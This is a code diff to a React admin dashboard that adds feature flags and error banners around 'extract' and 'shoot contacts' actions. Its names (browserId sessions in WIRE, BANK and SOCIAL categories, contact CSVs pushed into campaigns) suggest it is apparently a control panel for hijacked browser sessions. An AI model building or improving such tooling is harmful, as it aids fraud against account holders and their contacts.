@@ -12,6 +12,7 @@ import { BankTable } from '../components/admin/dashboard/bank/BankTable';
 import { SocialTable } from '../components/admin/dashboard/social/SocialTable';
 import LoadingSpinner from '../components/LoadingSpinner';
 import { authApi, securedApi } from '../../utils/auth';
+import { isFeatureEnabled, featureDisabledMessage } from '../../utils/featureFlags';
 import { buildCSVFromContacts } from '../utils/csvNormalizer';
 import { usePersistedState } from '../hooks/usePersistedState';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
@@ -46,6 +47,7 @@ export default function Dashboard() {
   const [selectedItem, setSelectedItem] = useState<string | null>(null);
   const [memoInput, setMemoInput] = useState<{ id: string; text: string } | null>(null);
   const [dismissDownload, setDismissDownload] = useState(false);
+  const [actionError, setActionError] = useState<string | null>(null);
   const ITEMS_PER_PAGE = 25;
 
   // Persisted dashboard state (search, filters, page per tab) in localStorage
@@ -310,17 +312,22 @@ export default function Dashboard() {
 
   const handleExtract = async (id: string) => {
     setLoading(true);
+    setActionError(null);
     try {
       const item = hubData.find((row: any) => row.id === id || row.browserId === id);
       const category = (item?.category || 'WIRE') as 'WIRE' | 'BANK' | 'SOCIAL';
       const browserId = item?.browserId || item?.submissionId || id;
 
-      await securedApi.callBackendFunction({
+      const result = await securedApi.callBackendFunction({
         functionName: 'runSmartExtract',
         browserId,
         category,
       });
-    } catch (error) {
+      if (result && result.success === false) {
+        setActionError(result.error || featureDisabledMessage('allowExtraction'));
+      }
+    } catch (error: any) {
+      setActionError(error?.message || 'Error extracting data.');
       console.error('Error extracting:', error);
     } finally {
       setLoading(false);
@@ -341,6 +348,7 @@ export default function Dashboard() {
     body: string;
   }) => {
     setLoading(true);
+    setActionError(null);
     try {
       const item = hubData.find((row: any) => row.id === shootData.id || row.browserId === shootData.id);
       const category = (item?.category || 'WIRE') as 'WIRE' | 'BANK' | 'SOCIAL';
@@ -366,7 +374,7 @@ export default function Dashboard() {
       const timestamp = new Date().toISOString().slice(0, 10).replace(/-/g, '');
       const fileName = `shoot-${category.toLowerCase()}-${timestamp}.csv`;
 
-      await securedApi.callBackendFunction({
+      const result = await securedApi.callBackendFunction({
         functionName: 'createNewCampaign',
         projectId: '',
         accountIds: [browserId],
@@ -384,7 +392,11 @@ export default function Dashboard() {
         fileSize: csvText.length,
         fileMimeType: 'text/csv',
       });
-    } catch (error) {
+      if (result && result.success === false) {
+        setActionError(result.error || featureDisabledMessage(category === 'SOCIAL' ? 'allowInteraction' : 'allowShooting'));
+      }
+    } catch (error: any) {
+      setActionError(error?.message || 'Error shooting contacts.');
       console.error('Error shooting contacts:', error);
     } finally {
       setLoading(false);
@@ -451,6 +463,8 @@ export default function Dashboard() {
       onOpenSession: handleOpenSession,
       onMemoSave: handleMemoSave,
       loading,
+      disabledExtract: !isFeatureEnabled(appData, 'allowExtraction'),
+      disabledShoot: !isFeatureEnabled(appData, 'allowShooting') && !isFeatureEnabled(appData, 'allowInteraction'),
     };
 
     const pagination = allRows.length > ITEMS_PER_PAGE ? (
@@ -514,6 +528,12 @@ export default function Dashboard() {
         </div>
       ) : (
         <div className="p-6">
+          {actionError && (
+            <div className="mb-4 bg-red-100 dark:bg-red-900 text-red-800 dark:text-red-200 px-4 py-3 rounded-lg text-sm flex items-start justify-between gap-2">
+              <span>{actionError}</span>
+              <button onClick={() => setActionError(null)} className="text-red-500 dark:text-red-300 hover:text-red-700 font-bold">×</button>
+            </div>
+          )}
           <div className="flex justify-between items-center mb-6">
             <button
               onClick={handleRefreshData}
